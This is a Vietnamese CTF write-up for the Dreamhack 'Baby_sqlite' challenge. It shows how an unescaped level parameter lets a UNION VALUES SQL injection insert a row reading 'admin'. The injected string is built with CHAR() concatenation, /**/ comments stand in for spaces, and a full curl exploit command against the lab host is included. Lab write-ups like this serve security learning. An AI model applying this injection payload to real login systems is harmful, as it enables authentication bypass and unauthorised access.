## Baby_sqlite
 Mục tiêu : Tận dụng SQL Injection để bỏ qua bước kiểm tra và lấy flag.
 Vào source gốc python,ta đọc code và thấy :
`
...
if result is not None:
                uid = result[0]
                if uid == 'admin':
                    return FLAG 
`

<img width="1508" height="658" alt="image" src="https://github.com/user-attachments/assets/46f90e8c-535d-407f-a14b-1f378b285c82" />
Vậy chúng ta cần đăng nhập vào tk admin để lấy được flag.
--> Chỉ user có uid = 'admin' mới được trả flag.
Nhưng trong database KHÔNG có user admin

```
if __name__ == '__main__':
    os.system('rm -rf %s' % DATABASE)
    with app.app_context():
        conn = get_db()
        conn.execute('CREATE TABLE users (uid text, upw text, level integer);')
        conn.execute("INSERT INTO users VALUES ('dream','cometrue', 9);")
        conn.commit()
```

→ Chèn tạm một hàng chứa chuỗi 'admin' bằng SQL Injection.
Lỗ hổng nằm ở tham số level=.
Nó được ghép vào query mà không được escape, cho phép inject:
`SELECT ... FROM users WHERE ... UNION VALUES ('admin')`
→ Kết quả query sẽ có thêm một dòng chứa 'admin'.
Và vì code chỉ cần thấy admin xuất hiện trong kết quả → trả flag.
SQLite cho phép tạo string bằng concatenation:
`CHAR(97)||CHAR(100)||CHAR(109)||CHAR(105)||CHAR(110)`
```
97 = 'a'
100 = 'd'
109 = 'm'
105 = 'i'
110 = 'n'
```
→ Ghép lại = "admin"

`level=0/**/UNION/**/VALUES(CHAR(97)||CHAR(100)||CHAR(109)||CHAR(105)||CHAR(110))`

Có nghĩa là:

```
0 để làm điều kiện trước không gây lỗi.

UNION thêm một dòng mới.

VALUES('admin') 
```
Gửi post này đi:
`curl -X POST "http://host3.dreamhack.games:23552/login" -d "uid=dream&upw=invalid&level=0/**/UNION/**/VALUES(CHAR(97)||CHAR(100)||CHAR(109)||CHAR(105)||CHAR(110))"`
<img width="2296" height="186" alt="image" src="https://github.com/user-attachments/assets/528e9294-3ea8-47fd-857e-ac513221b9ea" />

Ta được flag: ` DH{sql-lite-cass-lite} `


